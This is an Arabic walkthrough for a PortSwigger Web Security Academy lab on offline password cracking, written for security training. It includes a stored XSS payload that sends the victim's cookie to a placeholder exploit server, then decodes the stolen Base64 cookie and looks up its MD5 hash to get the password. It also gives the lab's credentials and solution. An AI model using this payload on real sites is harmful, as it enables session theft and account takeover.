# [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

> **الهدف:** استخراج كوكي  (stay-logged-in) للمستخدم`carlos`، واستخلاص هاش كلمة المرور، وكسرها  للحصول على كلمة المرور ، ثم تسجيل الدخول بحساب `carlos` وحذف الحساب 

---
## ملخص سريع

1. سجّل دخولك بحسابك واطّلع على كوكي "stay-logged-in"؛ ستجده مُشفرًا بـ Base64 ومكوّنًا كالتالي: `username:md5HashOfPassword`.
    
2. استغل ثغرة XSS المخزنة في تعليقات المدونة لجعل متصفح كارلوس يرسل كوكيه إلى خادم الاستغلال (exploit server).
    
3. استخرج الكوكي من سجلات الوصول في خادم الاستغلال، فكّه من Base64، واستخرج هاش MD5.
    
4. فك الهَاش (أو ابحث عنه عبر محرك بحث) لتحصل على كلمة المرور النصية (`onceuponatime`).
    
5. سجّل دخولك كـ `carlos` واحذف حسابه من صفحة "حسابي".
    

---

## الخطوات 
### 1) تسجيل الدخول وفحص كوكي stay-logged-in

- سجّل الدخول باستخدام: `wiener:peter`.
    
- في Burp: **Proxy → HTTP history** → اعثر على ردّ السيرفر لطلب تسجيل الدخول.
    
- ظلّل قيمة كوكي `stay-logged-in` وانسخها إلى **Burp Decoder**.
    
- فك Base64؛ سترى شكلًا مثل: `username:md5hash`.
    

**مثال للنتيجة بعد فك Base64:**

```
wiener:26323c16d5f4dabff3bb136f2460a943
```

---

### 2) معرفه cookie carlos من ثغرة XSS

- اللاب يحتوي على ثغرة XSS مخزنة داخل خانة التعليقات في المدونة.
    
- اذهب إلى **exploit server** وخذ عنوان الخادم (ID أو URL) الخاص بك، مثل `YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.
    
- أضف تعليقًا في إحدى المدونات بالحمولة التالية (استبدل YOUR-EXPLOIT-SERVER-ID بالمعرّف الخاص بك):
    

```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

- افتح سجلات الوصول على خادم الاستغلال (access log) وانتظر حتى يقوم الضحية بزيارة الصفحة — ستظهر هناك طلبات GET تحتوي على الكوكي المرسل.
    

---

### 3) استخراج وفك الكوكي

- من سجل الوصول (exploit server access log)، انسخ قيمة الكوكي التي وصلتك عبر الطلب.
    
- ألصق القيمة في **Burp Decoder** وفكّها من Base64.
    
- النتيجة المتوقعة: `carlos:26323c16d5f4dabff3bb136f2460a943`.
    

---

### 4) كسر/التعرّف على كلمة المرور

- خذ هاش MD5: `26323c16d5f4dabff3bb136f2460a943` وابحث عنه عبر محرك بحث أو استخدم قاعدة بيانات هاشات MD5/أدوات تحطيم الهاش.
    
- النتيجة المتطابقة هي كلمة المرور النصية: **`onceuponatime`**.
    
---

### 5) تسجيل الدخول بحساب `carlos` وحذف الحساب

-  اسم المستخدم: `carlos`

-  كلمة المرور: `onceuponatime`

- اذهب إلى صفحة **My account** واضغط حذف الحساب لحل اللاب.
---
